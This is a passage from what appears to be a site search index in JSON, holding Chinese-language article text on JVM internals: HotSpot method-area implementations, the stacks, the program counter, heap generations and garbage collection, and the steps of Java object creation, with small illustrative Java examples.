Old\u3001G1\uff09\u7b49\u3002\u8fd9\u4e9b\u56de\u6536\u5668\u9488\u5bf9\u4e0d\u540c\u7c7b\u578b\u7684\u5e94\u7528\u573a\u666f\u548c\u5185\u5b58\u9700\u6c42\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u4ee5\u63d0\u9ad8\u5783\u573e\u56de\u6536\u7684\u6548\u7387\u548c\u6027\u80fd\u3002</p> <p>3.\u4f18\u5316\u6280\u672f\uff1aHotSpot\u8fd8\u5305\u542b\u4e86\u8bb8\u591a\u9488\u5bf9\u6027\u80fd\u4f18\u5316\u7684\u6280\u672f\uff0c\u5982\u9003\u9038\u5206\u6790\u3001\u9501\u6d88\u9664\u3001\u5185\u8054\u4f18\u5316\u7b49\uff0c\u8fd9\u4e9b\u6280\u672f\u53ef\u4ee5\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u5bf9\u4ee3\u7801\u8fdb\u884c\u4f18\u5316\uff0c\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u7387\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0cHotSpot\u662f\u4e00\u4e2a\u6210\u719f\u3001\u9ad8\u6027\u80fd\u7684Java\u865a\u62df\u673a\u5b9e\u73b0\uff0c\u662fJava\u5e94\u7528\u7a0b\u5e8f\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u5e38\u7528\u7684\u8fd0\u884c\u73af\u5883\u4e4b\u4e00\u3002</p> <p>\u4e0d\u7ba1\u662fPermGen space \u8fd8\u662f MetaSpace \u4ed6\u4eec\u90fd\u662fHotspot\u9488\u5bf9\u65b9\u6cd5\u533a\u7684\u4e00\u79cd\u5b9e\u73b0\uff0c\u4e24\u8005\u6700\u5927\u7684\u533a\u522b\u5728\u4e8ePermGen space \u662f\u5728JVM\u865a\u62df\u673a\u4e2d\u5206\u914d\u5185\u5b58\u7684\uff0c\u800cMetaspace\u5219\u662f\u5728\u865a\u62df\u673a\u4e4b\u5916\u7684\u7cfb\u7edf\u672c\u5730\u5206\u914d\u5185\u5b58\u3002</p> <p>\u56e0\u4e3a\u5f88\u591a\u7c7b\u662f\u5728\u8fd0\u884c\u671f\u95f4\u52a0\u8f7d\u7684\uff0c\u8fd9\u90e8\u5206\u7c7b\u52a0\u8f7d\u7684\u7a7a\u95f4\u4e0d\u53ef\u63a7\uff0c\u5982\u679c\u8fd9\u90e8\u5206\u5185\u5b58\u662f\u5728JVM\u5185\u5b58\u91cc\u5206\u914d\u7684\u8bdd\uff0c\u6c38\u4e45\u4ee3\u5206\u914d\u592a\u5927\u90a3\u4e48JVM\u5176\u4ed6\u533a\u57df\uff08\u6bd4\u5982\u8bf4\u5806\uff09\u7684\u5185\u5b58\u5c31\u4f1a\u53d8\u5c0f\uff0c\u53cd\u4e4b\u5982\u679c\u8bbe\u7f6e\u592a\u5c0f\uff0c\u5c31\u5bb9\u6613\u51fa\u73b0\u65b9\u6cd5\u533a\u5185\u5b58\u6ea2\u51fa\uff0c\u56e0\u4e3a\u672c\u8eab\u5b58\u50a8\u7684\u7c7b\u4fe1\u606f\u5c5e\u4e8e\u4e0d\u786e\u5b9a\u5927\u5c0f\uff0c\u7c7b\u4fe1\u606f\u5728\u6211\u4eec\u8fd0\u884c\u7684\u65f6\u5019\u53ef\u4ee5\u52a8\u6001\u52a0\u8f7d\u3002\u6240\u4ee5jdk1.8\u4e2d\u9009\u62e9\u628aMetaspace\u5185\u5b58\u5206\u914d\u5728\u672c\u5730\u5185\u5b58\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u597d\u5904\u662fMetaspace\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0d\u4f1a\u53d7\u9650\u4e8e\u865a\u62df\u673a\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u53ea\u4f1a\u53d7\u9650\u4e8e\u673a\u5668\u5185\u5b58\uff0c\u53ef\u5206\u914d\u7684\u5185\u5b58\u5927\u4e86\u90a3\u4e48\u5c31\u4e0d\u4f1a\u90a3\u4e48\u5bb9\u6613\u51fa\u73b0\u5185\u5b58\u6ea2\u3002</p>"},{"location":"CTF/Java_Security/Article3/index.html#3","title":"3.\u5b57\u7b26\u4e32\u5e38\u91cf\u3001\u9759\u6001\u53d8\u91cf\u6570\u636e\u5b58\u653e\u533a\u57df","text":"<p>java6\u4e2d \u6240\u6709\u5e38\u91cf\u6c60\u6570\u636e\u662f\u5b58\u653e\u5728\u6c38\u4e45\u4ee3\u4e2d\uff0c\u4f46\u5230java7\u540e Hostpot \u628a\u6c38\u4e45\u4ee3\u4e2d\u7684\u5b57\u7b26\u4e32\u5e38\u91cf\u3001\u9759\u6001\u53d8\u91cf\u6570\u636e\u8fc1\u79fb\u5230\u4e86\u5806\u4e2d\uff0c\u540e\u9762\u7684java 8\u5e76\u6ca1\u6709\u5bf9\u8fd9\u90e8\u5206\u5185\u5bb9\u8fdb\u884c\u8fc1\u79fb\uff0c\u5728java8 \u4e2d\u5b57\u7b26\u4e32\u5e38\u91cf\u3001\u9759\u6001\u53d8\u91cf\u6570\u636e\u8fd8\u662f\u653e\u5230\u5806\u4e2d\uff0c\u6240\u4ee5\u5e38\u91cf\u6c60\u53ea\u662f\u5728JVM\u89c4\u8303\u5b9a\u4e49\u4e0a\u5c5e\u4e8e\u65b9\u6cd5\u533a\uff0c\u4f46Hotspot\u5728\u5b9e\u73b0\u7684\u65f6\u5019\u90e8\u5206\u5e38\u91cf\u6c60\u7684\u5185\u5bb9\u5b9e\u9645\u4e0a\u662f\u4fdd\u5b58\u5728\u5806\u4e2d\u4e86\u3002</p>"},{"location":"CTF/Java_Security/Article3/index.html#_2","title":"\u4e8c.\u865a\u62df\u673a\u6808","text":"<p>\u6808\u8fd9\u90e8\u5206\u533a\u57df\u4e3b\u8981\u662f\u7528\u4e8e\u7ebf\u7a0b\u8fd0\u884c\u65b9\u6cd5\u7684\u533a\u57df\uff0c\u6b64\u533a\u57df\u5c5e\u4e8e\u7ebf\u7a0b\u79c1\u6709\u7684\u7a7a\u95f4\uff0c\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u521b\u5efa\u540e\u90fd\u4f1a\u7533\u8bf7\u4e00\u4e2a\u81ea\u5df1\u5355\u72ec\u7684\u6808\u7a7a\u95f4\uff0c\u6bcf\u4e00\u4e2a\u65b9\u6cd5\u7684\u8c03\u7528\u90fd\u4f1a\u5bf9\u5e94\u7740\u4e00\u4e2a\u6808\u5e27\u3002</p> <p>\u6808\u5e27\u91cc\u5b58\u50a8\u7740\u65b9\u6cd5\u7684\u5c40\u90e8\u53d8\u91cf\u8868\uff08\u4fdd\u5b58\u7740\u53d8\u91cf\u7684\u6570\u636e\uff09\u3001\u64cd\u4f5c\u6570\u6808(\u8fdb\u884c\u8fd0\u7b97\u65f6\u5b58\u653e\u6570\u636e\u7684\u7a7a\u95f4)\u3001\u52a8\u6001\u8fde\u63a5\uff08\u6307\u5411\u5e38\u91cf\u6c60\u7684\u5f15\u7528\uff09\u548c\u65b9\u6cd5\u8fd4\u56de\u5730\u5740\uff08\u5f53\u524d\u65b9\u6cd5\u8fd4\u56de\u540e\u7684\u6570\u636e\u5b58\u653e\u7684\u5730\u65b9\uff09\u4fe1\u606f\u3002</p> <p>\u6bcf\u8c03\u7528\u4e00\u4e2a\u65b9\u6cd5\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u6808\u5e27\uff0c\u8c03\u7528\u65b9\u6cd5\u7684\u8fc7\u7a0b\u5c31\u662f\u4e00\u4e2a\u538b\u6808\u548c\u51fa\u6808\u7684\u8fc7\u7a0b\uff0c\u9075\u5faa\u5148\u8fdb\u540e\u51fa\u7684\u539f\u5219\uff0c\u6bd4\u5982\u4e0b\u9762\u4ee3\u7801,\u7528 main() \u8c03\u7528 test1() \u518d\u8c03\u7528test2()\u7684\u6267\u884c\u8fc7\u7a0b\u7c7b\u4f3c\u4e8e\u4e0b\u56fe\u3002</p> <pre><code>public class TestStack {\n\n    public static void main(String[] args) {\n        System.out.println(\"\u6267\u884cmain\u65b9\u6cd5\");\n        test1();\n\n    }\n\n    public static void  test1(){\n        System.out.println(\"test-1\");\n                test2();\n    }\n\n    public static void  test2(){\n        System.out.println(\"test-2\");\n    }\n\n}\n</code></pre> <p>\u538b\u69a8\u51fa\u6808\u8fc7\u7a0b</p> <p></p>"},{"location":"CTF/Java_Security/Article3/index.html#_3","title":"\u4e09.\u672c\u5730\u65b9\u6cd5\u6808","text":"<p>\u7531\u4e8ejava\u9700\u8981\u4e0e\u4e00\u4e9b\u5e95\u5c42\u7cfb\u7edf\u5982\u64cd\u4f5c\u7cfb\u7edf\u6216\u67d0\u4e9b\u786c\u4ef6\u4ea4\u6362\u4fe1\u606f\u65f6\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u9700\u8981\u901a\u8fc7\u8c03\u7528native\u672c\u5730\u65b9\u6cd5\u6765\u5b9e\u73b0\uff0c\u672c\u5730\u65b9\u6cd5\u6808\u548c\u865a\u62df\u673a\u6808\u529f\u80fd\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u5728\u4e8e\u672c\u5730\u65b9\u6cd5\u6808\u662f\u865a\u62df\u673a\u8c03\u7528native\u65b9\u6cd5\u65f6\u4f7f\u7528\u7684\u3002</p>"},{"location":"CTF/Java_Security/Article3/index.html#_4","title":"\u56db.\u7a0b\u5e8f\u8ba1\u6570\u5668","text":"<p>\u7a0b\u5e8f\u8ba1\u6570\u5668\u662f\u4e00\u5757\u8f83\u5c0f\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5b83\u7684\u4f5c\u7528\u53ef\u4ee5\u770b\u4f5c\u662f\u5f53\u524d\u7ebf\u7a0b\u6240\u6267\u884c\u7684\u5b57\u8282\u7801\u7684\u884c\u53f7\u6307\u793a\u5668\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668\u8bb0\u5f55\u7740\u67d0\u4e2a\u7ebf\u7a0b\u5f53\u524d\u6267\u884c\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u6b64\u533a\u57df\u5c5e\u4e8e\u7ebf\u7a0b\u9694\u79bb\u533a\u3002</p> <p>\u56e0\u4e3aCPU\u662f\u6839\u636e\u65f6\u95f4\u7247\u7684\u65b9\u5f0f\u5206\u914d\u8d44\u6e90\u7684\uff0c\u5b83\u5728\u67d0\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fdb\u884c\u8c03\u5ea6\u7684\u65f6\u95f4\u662f\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u65f6\u95f4\u7247\uff0c\u6240\u4ee5\u5f53CPU\u4eceA\u7ebf\u7a0b\u5207\u6362\u5230B\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u5c31\u9700\u8981\u8bb0\u5f55A\u7ebf\u7a0b\u5f53\u524d\u6307\u4ee4\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u65b9\u4fbfCPU\u518d\u6b21\u5207\u56deA\u7ebf\u7a0b\u65f6\u53ef\u4ee5\u4ece\u4e0a\u6b21\u7684\u4f4d\u7f6e\u5f00\u59cb\u7ee7\u7eed\u6267\u884c\u6307\u4ee4\uff0c \u800c\u7a0b\u5e8f\u8ba1\u6570\u5668\u5c31\u662f\u7528\u6765\u8bb0\u5f55\u7ebf\u7a0b\u6307\u4ee4\u5386\u53f2\u4f4d\u7f6e\u7684\u533a\u57df\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article3/index.html#_5","title":"\u4e94.\u5806","text":"<p>\u5806\u5185\u5b58\u4e3b\u8981\u662f\u7528\u6765\u5b58\u653e\u521b\u5efa\u7684\u5bf9\u8c61\u6570\u636e\uff0c\u6b64\u533a\u57df\u5c5e\u4e8e\u7ebf\u7a0b\u5171\u4eab\u533a\uff0c\u5bf9\u4e8e\u5f00\u53d1\u4eba\u5458\u6765\u8bf4\u8fd9\u5757\u533a\u57df\u662f\u6211\u4eec\u5173\u6ce8\u7684\u6bd4\u8f83\u591a\u7684\uff0c\u56e0\u4e3a\u5f88\u591a\u4f18\u5316\u90fd\u662f\u9488\u5bf9\u5806\u533a\u6765\u8fdb\u884c\u7684\uff0c\u4e3a\u4e86\u80fd\u66f4\u6e05\u695a\u7684\u63cf\u8ff0\u5806\u91cc\u7684\u6570\u636e\u548c\u5206\u533a\u4fe1\u606f\uff0c\u6240\u4ee5\u4f1a\u7ed3\u5408\u5783\u573e\u56de\u6536\u7684\u4e00\u4e9b\u673a\u5236\u6765\u63cf\u8ff0\u8fd9\u5757\u5185\u5b58\u533a\u57df\u3002</p>"},{"location":"CTF/Java_Security/Article3/index.html#1_1","title":"1.\u65b0\u751f\u4ee3\u548c\u8001\u5e74\u4ee3\u5212\u5206\u673a\u5236","text":"<p>\u5806\u5185\u5b58\u4e3b\u8981\u662f\u7528\u6765\u5b58\u653e\u6211\u4eec\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u521b\u5efa\u7684\u5bf9\u8c61\u6570\u636e\uff0c\u6839\u636e\u5bf9\u8c61\u6240\u751f\u5b58\u65f6\u95f4\u957f\u77ed\u7684\u7279\u6027\u5728\u903b\u8f91\u4e0a\u5206\u4e3a \u65b0\u751f\u4ee3\u548c\u8001\u5e74\u4ee3\u3002</p> <p>\u5bf9\u4e8eJVM\u800c\u8a00\uff0c\u5927\u90e8\u5206\u5bf9\u8c61\u90fd\u662f\u5c5e\u4e8e\u4e00\u4e2a\u671d\u751f\u5915\u6b7b\u7684\u72b6\u6001\uff0c\u8fd9\u90e8\u5206\u5bf9\u8c61\u968f\u7740\u65b9\u6cd5\u7684\u8c03\u7528\u800c\u521b\u5efa\uff0c\u65b9\u6cd5\u7684\u7ed3\u675f\u800c\u6d88\u4ea1\uff0c\u53ea\u6709\u5c11\u90e8\u5206\u7684\u5bf9\u8c61\u4f1a\u957f\u4e45\u7684\u7559\u5728JVM \u5185\u5b58\u4e2d\uff0c\u6240\u4ee5\u6839\u636e\u8fd9\u6837\u7684\u7279\u6027JVM \u628a\u5185\u5b58\u5206\u4e3a\u4e86\u65b0\u751f\u4ee3 \u548c\u8001\u5e74\u4ee3\u4e24\u4e2a\u533a\uff0c\u4e00\u822c\u60c5\u51b5\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4f1a\u653e\u5230\u65b0\u751f\u4ee3\u4e2d\uff0c\u53ea\u6709\u7ecf\u8fc7\u4e00\u5b9a\u6b21\u6570\u7684GC\u540e\u8fd8\u6ca1\u6709\u88ab\u56de\u6536\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u8ba4\u4e3a\u8fd9\u90e8\u5206\u5bf9\u8c61\u5728\u672a\u6765\u4e5f\u4f1a\u957f\u65f6\u95f4\u5b58\u5728\uff0c\u6240\u4ee5\u4f1a\u628a\u8fd9\u90e8\u5206\u7684\u5bf9\u8c61\u8f6c\u79fb\u5230\u8001\u5e74\u4ee3\u7684\u533a\u57df\u4e2d\u53bb\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article3/index.html#2eden-survior","title":"2.Eden\u533a\u548c Survior \u5212\u5206\u673a\u5236","text":"<p>\u6211\u4eec\u5c1d\u8bd5\u60f3\u8c61\u4e00\u4e0b\uff0c\u5982\u679c\u65b0\u751f\u4ee3\u4e0d\u8fdb\u884c\u4efb\u4f55\u5206\u533a\uff0c\u6211\u4eec\u5783\u573e\u56de\u6536\u7684\u8fc7\u7a0b\u662f\u600e\u6837\u7684\u3002</p> <p>1.\u9996\u5148\u6211\u4eec\u4f1a\u628a\u9700\u8981\u56de\u6536\u7684\u5bf9\u8c61\u8fdb\u884c\u6807\u8bb0\u3002</p> <p>2.\u7136\u540e\u628a\u6807\u8bb0\u4e3a\u5783\u573e\u7684\u5bf9\u8c61\u8fdb\u884c\u6e05\u9664\u3002</p> <p>\u8fc7\u7a0b\u7c7b\u4f3c\u4e0b\u56fe\uff1a</p> <p></p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u56fe\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6765\uff0cGC\u628a\u5783\u573e\u5bf9\u8c61\u56de\u6536\u540e\u5982\u679c\u4e0d\u5bf9\u5b58\u6d3b\u4e0b\u6765\u7684\u5bf9\u8c61\u8fdb\u884c\u6574\u7406\uff0c\u90a3\u4e48\u5c31\u4f1a\u51fa\u73b0\u5f88\u591a\u4e0d\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u7a7a\u95f4\u788e\u7247\uff0c\u56e0\u4e3a\u6ca1\u6709\u8fde\u7eed\u7684\u7a7a\u95f4\u5206\u914d\uff0c\u8fd9\u6837\u5c31\u53ef\u80fd\u9020\u6210\u6211\u4eec\u4e00\u4e2a\u5927\u5bf9\u8c61\u8fc7\u6765\u7533\u8bf7\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u660e\u660e\u5185\u5b58\u662f\u6709\u8db3\u591f\u5bb9\u7eb3\u5bf9\u8c61\u7684\u603b\u7a7a\u95f4\uff0c\u4f46\u662f\u5374\u56e0\u4e3a\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u4e0d\u8fde\u7eed\u6027\u5bfc\u81f4\u5bf9\u8c61\u65e0\u6cd5\u521b\u5efa\u3002</p> <p>\u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u8fd9\u79cd\u7a7a\u95f4\u788e\u7247\uff0c\u6240\u4ee5\u5c31\u628a\u65b0\u751f\u4ee3\u5206\u4e3a\u4e86Eden \u533a\u548cSurvior \u533a\uff0c\u5728\u8fdb\u884c\u5783\u573e\u56de\u6536\u65f6\uff0c\u5148\u628a\u5b58\u6d3b\u7684\u5bf9\u8c61\u590d\u5236\u5230 Survior \u533a\uff0c\u7136\u540e\u518d\u5bf9Eden\u533a\u7edf\u4e00\u8fdb\u884c\u6e05\u7406\uff0c\u8fd9\u6837\u7684\u8bddEden\u533a\u6bcf\u6b21GC\u8fc7\u540e\u90fd\u662f\u7559\u4e0b\u7684\u4e00\u7247\u8fde\u7eed\u7684\u7a7a\u95f4\uff1a</p> <p></p>"},{"location":"CTF/Java_Security/Article3/index.html#3s1-s2","title":"3.S1 \u533a\u548cS2\u533a\u5212\u5206\u673a\u5236","text":"<p>\u4e0a\u9762\u6211\u4eec\u628a\u65b0\u751f\u4ee3\u5212\u5206\u4e3aEden\u533a\u548cSurvior\u533a\u540e\uff0c\u7a7a\u95f4\u788e\u7247\u95ee\u9898\u597d\u50cf\u6539\u5584\u4e86\u5f88\u591a\uff0c\u56e0\u4e3a\u8fd9\u6837\u89e3\u51b3\u4e86Eden\u533a\u7684\u7a7a\u95f4\u788e\u7247\u95ee\u9898\uff0c\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\u6211\u4eec\u5ffd\u7565\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7a7a\u95f4\u788e\u7247\u95ee\u9898Survior \u533a\u4e5f\u4f1a\u5b58\u5728\uff0c\u56e0\u4e3a\u8fdb\u884cGC\u65f6\uff0c\u6211\u4eecSurvior \u533a\u4e5f\u4f1a\u6709\u5783\u573e\u5bf9\u8c61\uff0c\u6240\u4ee5\u6bcf\u6b21GC\u4e5f\u4f1a\u5bf9Survior \u533a\u8fdb\u884c\u6807\u8bb0\u6e05\u9664\uff0c\u90a3\u4e48\u8fd9\u6837\u7684\u8bddSurvior \u533a\u4e5f\u540c\u6837\u4f1a\u51fa\u73b0\u4e0d\u8fde\u7eed\u7684\u7a7a\u95f4\u3002</p> <p></p> <p>\u4e3a\u4e86\u907f\u514dSurvior\u533a\u7684\u7a7a\u95f4\u788e\u7247\uff0c\u6240\u4ee5\u6211\u4eec\u628aSurvior \u5206\u6210\u4e86S1\u533a\u548cS2\u533a\uff0c\u5728\u540c\u4e00\u65f6\u95f4S1\u548cS2\u533a\u53ea\u4f1a\u6709\u4e00\u4e2a\u5b58\u653e\u5bf9\u8c61\uff0c\u6bcf\u6b21\u8fdb\u884c\u5783\u573e\u56de\u6536\u7684\u65f6\u5019\uff0c\u6211\u4eec\u90fd\u4f1a\u628a\u4e0d\u80fd\u8fdb\u884c\u56de\u6536\u7684\u5bf9\u8c61\u653e\u5230S1\u6216S2\u5176\u4e2d\u7684\u67d0\u4e00\u4e2a\u533a\uff0c\u5783\u573e\u56de\u6536\u7684\u6d41\u7a0b\u7c7b\u4f3c\u4e0b\u9762\u51e0\u4e2a\u6b65\u9aa4\u3002</p> <p>1.\u7b2c\u4e00\u6b21GC\u6211\u4eec\u4f1a\u628aEden\u533a\u7684\u4e0d\u53ef\u56de\u6536\u5bf9\u8c61\u62f7\u8d1d\u5230S1\u533a\uff0c\u7136\u540e\u628aEden\u533a\u7684\u6240\u6709\u5bf9\u8c61\u8fdb\u884c\u6e05\u7406\u3002</p> <p>2.\u7b2c\u4e8c\u6b21GC\u6211\u4eec\u4f1a\u628aEden\u533a\u548cS1\u533a\u4e0d\u53ef\u56de\u6536\u7684\u5bf9\u8c61\u62f7\u8d1d\u5230S2\u533a\uff0c\u7136\u540e\u628aEden\u533a\u548cS1\u533a\u7684\u6240\u6709\u5bf9\u8c61\u8fdb\u884c\u6e05\u7406\u3002</p> <p>3.\u7b2c\u4e09\u6b21GC\u6211\u4eec\u4f1a\u628aEden\u533a\u548cS2\u533a\u4e0d\u53ef\u56de\u6536\u7684\u5bf9\u8c61\u62f7\u8d1d\u5230S1\u533a\uff0c\u7136\u540e\u628aEden\u533a\u548cS2\u533a\u7684\u6240\u6709\u5bf9\u8c61\u8fdb\u884c\u6e05\u7406\u3002</p> <p>..........</p> <p>\u5c31\u8fd9\u6837\u6211\u4eec\u6bcf\u6b21GC\u90fd\u90fd\u80fd\u4fdd\u8bc1S\u533a\u6709\u4e00\u5757\u7a7a\u767d\u8fde\u7eed\u7684\u5185\u5b58\u53ef\u4ee5\u63d0\u4f9b\u6211\u4eec\u4f7f\u7528\u3002</p> <p></p> <p>\u6700\u540e\u7ecf\u8fc7\u4e86\u4e00\u4e9b\u7279\u5b9a\u533a\u57df\u804c\u8d23\u5212\u5206\u540e\uff0c\u5806\u5185\u5b58\u5212\u5206\u4e3a \u8001\u5e74\u4ee3\u3001\u65b0\u751f\u4ee3\uff0c\u65b0\u751f\u4ee3\u53c8\u5212\u5206\u4e3aEden\u533a\u3001s1\u533a\u3001s2\u533a\u57df\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article4/index.html","title":"Index","text":"<p>\u7efc\u5408\u4e4b\u524d\u4e24\u7bc7\u7684\u77e5\u8bc6\uff0c\u7ed3\u5408\u4ee3\u7801\u4e00\u8d77\u63a8\u6f14\u4e00\u4e0b\u5bf9\u8c61\u7684\u771f\u5b9e\u521b\u5efa\u8fc7\u7a0b\uff0c\u4ee5\u53ca\u5bf9\u8c61\u521b\u5efa\u5b8c\u4e4b\u540e\u5b9e\u9645\u5728JVM\u5185\u5b58\u91cc\u662f\u5982\u4f55\u4fdd\u5b58\u7684\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u7c7b\u7684\u4ee3\u7801\u5206\u522b\u8ffd\u8e2a\u7c7b\u7684\u9759\u6001\u53d8\u91cf\u3001\u6210\u5458\u53d8\u91cf\u3001\u5728\u7ecf\u8fc7\u9759\u6001\u5757\u3001\u5bf9\u8c61\u4ee3\u7801\u5757\u7684\u53d8\u66f4\u540e\uff0c\u6700\u7ec8\u521b\u5efa\u5b8c\u7684\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u662f\u5982\u4f55\u6807\u793a\u548c\u4fdd\u5b58\u7684\uff0c\u6f14\u793a\u6d41\u7a0b\u548c\u6f14\u793a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p> <pre><code>public class Person {\n    //\u9759\u6001\u53d8\u91cf\n    public  static  int staicVariabl=1;\n    //\u6210\u5458\u53d8\u91cf\n    public   int  objVariabl;\n    //\u9759\u6001\u521d\u59cb\u4ee3\u7801\u5757\n    static {\n        staicVariabl=2;\n    }\n    //\u5bf9\u8c61\u521d\u59cb\u5316\u4ee3\u7801\u5757\n    {\n        objVariabl=88;\n    }\n    //\u6784\u9020\u65b9\u6cd5\n    public Person() {\n        objVariabl=99;\n    }\n    public static void main(String[] args) {\n        Person person=new Person();\n    }\n}\n</code></pre>"},{"location":"CTF/Java_Security/Article4/index.html#_1","title":"\u4e00.\u7f16\u8bd1","text":"<p>\u7ecf\u8fc7\u7f16\u8bd1\u540ePerson.java \u4f1a\u751f\u6210\u4e00\u4e2aPerson.class\u6587\u4ef6\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article4/index.html#_2","title":"\u4e8c.\u88c5\u8f7d","text":"<p>Person.class\u7ecf\u8fc7\u52a0\u8f7d\u540e\uff0c\u4f1a\u628a\u7c7b\u7684\u76f8\u5173\u4fe1\u606f\u52a0\u8f7d\u5230JVM\u5185\u5b58\u4e2d\uff0c\u89e3\u6790\u51fa\u7c7b\u7684\u63cf\u8ff0\u4fe1\u606f\u4f1a\u4fdd\u5b58\u5230Metaspace,\u540c\u65f6\u8fd9\u91cc\u4f1a\u751f\u6210\u4e00\u4e2a\u4ee3\u8868\u8fd9\u4e2a\u7c7b\u7684java.lang.Class\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u8fd9\u4e2a\u7c7b\u7684\u5404\u79cd\u6570\u636e\u7684\u8bbf\u95ee\u5165\u53e3\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article4/index.html#_3","title":"\u4e09.\u8fde\u63a5","text":"<p>\u8fde\u63a5\u9636\u6bb5\u4f1a\u5bf9\u9759\u6001\u53d8\u91cf\u7684\u503c\u8fdb\u884c\u9ed8\u8ba4\u8d4b\u503c\uff0c\u6b64\u65f6Person\u7c7b\u7684staicVariabl \u8d4b\u503c\u4e3a0\uff1b</p> <p></p>"},{"location":"CTF/Java_Security/Article4/index.html#_4","title":"\u56db.\u521d\u59cb\u5316","text":"<p>1.\u9996\u5148\u4f1a\u5bf9Person\u7c7b\u7684\u9759\u6001\u53d8\u91cfstaicVariabl \u8fdb\u884c\u771f\u6b63\u7684\u8d4b\u503c\u7684\u64cd\u4f5c\uff08\u6b64\u65f6staicVariabl =1\uff09\u3002</p> <p>2.\u7136\u540e\u6536\u96c6\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u5757\u5185\u5bb9\uff0c\u751f\u6210\u4e00\u4e2a\u7c7b\u7684() \u65b9\u6cd5\u5e76\u6267\u884c\uff08\u6b64\u65f6staicVariabl =2\uff09\u3002 <p></p>"},{"location":"CTF/Java_Security/Article4/index.html#_5","title":"\u4e94.\u5bf9\u8c61\u521b\u5efa","text":"<p>\u5f53\u6211\u4eecnew\u4e00\u4e2a\u5bf9\u8c61\u7684\u65f6\u5019JVM\u9996\u5148\u4f1a\u53bb\u627e\u5230\u5bf9\u5e94\u7684\u7c7b\u5143\u4fe1\u606f\uff0c\u5982\u679c\u627e\u4e0d\u5230\u610f\u5473\u7740\u7c7b\u4fe1\u606f\u8fd8\u6ca1\u6709\u88ab\u52a0\u8f7d\uff0c\u6240\u4ee5\u5728\u5bf9\u8c61\u521b\u5efa\u7684\u65f6\u5019\u4e5f\u53ef\u80fd\u4f1a\u89e6\u53d1\u7c7b\u7684\u52a0\u8f7d\u64cd\u4f5c\u3002\u5f53\u7c7b\u5143\u4fe1\u606f\u88ab\u52a0\u8f7d\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u7c7b\u5143\u4fe1\u606f\u6765\u786e\u5b9a\u5bf9\u8c61\u4fe1\u606f\u548c\u9700\u8981\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u3002</p>"},{"location":"CTF/Java_Security/Article4/index.html#_6","title":"\u5bf9\u8c61\u521b\u5efa\u7684\u6d41\u7a0b","text":"<p>\u5f53\u6211\u4eec\u6267\u884c\u4e0a\u9762\u4ee3\u7801\u4e2dmain\u65b9\u6cd5\u4e2d\u7684 Person person=new Person() \u65f6\uff0c\u6211\u4eec\u7684\u5bf9\u8c61\u5c31\u5f00\u59cb\u521b\u5efa\u4e86\uff0c\u6267\u884c\u6d41\u7a0b\u5927\u81f4\u5206\u4e3a\u4e09\u6b65\uff1a</p> <p>1.\u6784\u5efa\u5bf9\u8c61\uff1a\u9996\u5148main\u7ebf\u7a0b\u4f1a\u5728\u6808\u4e2d\u7533\u8bf7\u4e00\u4e2a\u81ea\u5df1\u7684\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u8c03\u7528main\u65b9\u6cd5\u540e\u4f1a\u751f\u6210\u4e00\u4e2amain\u65b9\u6cd5\u7684\u6808\u5e27\u3002\u7136\u540e\u6267\u884cnew Person() \uff0c\u8fd9\u91cc\u4f1a\u6839\u636ePerson\u7c7b\u5143\u4fe1\u606f\u5148\u786e\u5b9a\u5bf9\u8c61\u7684\u5927\u5c0f\uff0c\u5411JVM\u5806\u4e2d\u7533\u8bf7\u4e00\u5757\u5185\u5b58\u533a\u57df\u5e76\u6784\u5efa\u5bf9\u8c61\uff0c\u540c\u65f6\u5bf9Person\u5bf9\u8c61\u6210\u5458\u53d8\u91cf\u4fe1\u606f\u5e76\u8d4b\u9ed8\u8ba4\u503c\u3002</p> <p></p> 